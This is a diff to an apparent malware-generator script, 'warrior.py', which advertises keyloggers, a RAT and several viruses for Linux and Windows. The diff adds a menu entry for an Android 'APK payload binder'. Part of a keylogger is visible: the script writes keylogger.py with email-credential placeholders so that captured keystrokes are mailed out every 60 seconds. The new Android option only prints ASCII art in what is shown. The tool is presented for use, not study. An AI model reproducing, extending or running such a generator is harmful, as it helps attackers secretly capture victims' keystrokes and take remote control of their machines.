@@ -1,3 +1,5 @@
+import os
+import time
 import colorama
 from colorama import Fore,Style,Back
 import socket
@@ -5,8 +7,12 @@ import shutil
 import smtplib
 from threading import Timer
 from datetime import datetime
-        file = open("keylogger.py", "w+")
-        file.write('''SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
+import platform
+print(platform.system())
+print(platform.release())
+print(platform.version())
+file = open("keylogger.py", "w+")
+file.write('''SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
     EMAIL_ADDRESS = "put_real_address_here@gmail.com"
     EMAIL_PASSWORD = "put_real_pw"
 
@@ -2518,13 +2524,38 @@ def linux_virus():
     ''')
 def thanks():
         print(Fore.MAGENTA + '''
-            |￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣|
-       Dont be a Script Kiddie.
+     |￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣|
+      Thank you for using warrior!
     |＿＿＿＿＿＿＿＿＿＿＿____________|
     (\__/) ||
     (•ㅅ•) ||
     / 　 づ
         ''')
+def android():
+    print(Fore.MAGENTA + '''
+          +────▀▄───▄▀─────+ |||==================|
+        ──────▄█▀███▀█▄───────|| A P K            |
+        ─────█▀███████▀█──────|| P A Y L O A D    |
+        ─────█─█▀▀▀▀▀█─█──────|| B I N D E R      |
+        ────────▀▀─▀▀─────────||                  |
+        ==========================================|''')
+   #cooooooooooooooooooooooooooment
+   #
+   #
+   #
+   #
+   #
+   #
+   #
+   #
+   #
+   #
+   #
+   #
+   #
+   #cooooooooooooooooooooooooooooooment
+
+
 print(Fore.CYAN + '''
  █████   ███   █████                                ███                    
 ░░███   ░███  ░░███                                ░░░                     
@@ -2539,7 +2570,15 @@ print(Fore.MAGENTA
  + '''
 Coded by FonderElite || Droid
 ''')
-print('Virus Generator for Linux and Windows')
+print('Virus Generator for Linux,Windows w/ Apk Payload Binder ')
+time.sleep(2)
+plat = platform.system()
+rel  = platform.release()
+ver  = platform.version()
+
+print(Fore.RED + "Operating System:" + plat)
+print(Fore.RED + "Operating System:" + rel )
+print(Fore.RED + "Operating System:" + ver)
 time.sleep(2)
 print(Fore.YELLOW + '''
 =============================================
@@ -2556,9 +2595,11 @@ print(Fore.YELLOW + '''
 ===================================================|
 +|  Ex. python3 warrior.py -o Linux -v 1 -s        |+
 +|          (Create KeyLogger)                     |+
++| Ex. python3 warrior.py -o Android -s            |+
++|           (Apk payload binder)                  |+
 ===================================================|''')
 
-print(Fore.WHITE + "Available for: Linux & Windows")
+print(Fore.WHITE + "Available for: Linux & Windows w/ Apk Payload Binder")
 help = Fore.YELLOW + '''
 =============================================
 +|     Virus/Malware/Worm Generator        |+
@@ -2575,15 +2616,15 @@ help = Fore.YELLOW + '''
 os = str(os.getcwd())
 command = input(Fore.CYAN + "[+]Input a Command: ")
 if command == "python3 warrior.py -h":
-    print(help)
-    print("Try again.")
+   print(help)
+   print("Try again.")
 elif command == "python3 warrior.py":
     print(help)
     print("Try again.")
 elif command == "python3 warrior.py -o":
     print(Fore.CYAN + 'Available operating systems...')
     time.sleep(2)
-    print("Linux & Windows.")
+    print("Linux, Windows, Android")
 elif command == "python3 warrior.py -v":
     print(Fore.MAGENTA + '''  
 =============================================
@@ -2615,7 +2656,18 @@ elif command == "python3 warrior.py -v":
     +|       [7]ILY Virus                      |+
      ===========================================
      ===========================================
+     
+     
         ''')
+    time.sleep(2)
+    print(Fore.MAGENTA + '''
+      +────▀▄───▄▀─────+ |||==================|
+    ──────▄█▀███▀█▄───────|| A P K            |
+    ─────█▀███████▀█──────|| P A Y L O A D    |
+    ─────█─█▀▀▀▀▀█─█──────|| B I N D E R      |
+    ────────▀▀─▀▀─────────||                  |
+    python3 warrior.py -o Android -s          |
+    ==========================================|''')
 elif command == "python3 warrior.py -o Windows":
     print(Fore.GREEN + '''
 =============================================
@@ -2632,6 +2684,17 @@ elif command == "python3 warrior.py -o Windows":
 +|       [7]ILY Virus                      |+
  ===========================================
     ''')
+
+elif command == "python3 warrior.py -o Android":
+    print(Fore.MAGENTA + '''
+  +────▀▄───▄▀─────+ |||==================|
+──────▄█▀███▀█▄───────|| A P K            |
+─────█▀███████▀█──────|| P A Y L O A D    |
+─────█─█▀▀▀▀▀█─█──────|| B I N D E R      |
+────────▀▀─▀▀─────────||                  |
+python3 warrior.py -o Android -s          |
+==========================================|''')
+
 elif command == "python3 warrior.py -o Linux":
     print(Fore.MAGENTA + '''
       
@@ -2648,7 +2711,6 @@ elif command == "python3 warrior.py -o Linux":
 +|       [6]Rat                            |+
  ===========================================
     ''')
-
 elif command == "python3 warrior.py -u":
     print("Preparing for update...")
     os.system("git clone https://github.com/fonderelite/warrior")
@@ -2783,6 +2845,9 @@ elif command == "python3 warrior.py -o Linux -v 6 -s":
     time.sleep(3)
     print(Fore.GREEN + "DONE!")
     thanks()
+elif command == "python3 warrior.py -o Android -s":
+    print(Fore.YELLOW + "Your Current Dir is:" + os)
+    android()
 else:
    print(Fore.RED + '''
  ██████████                                        ███
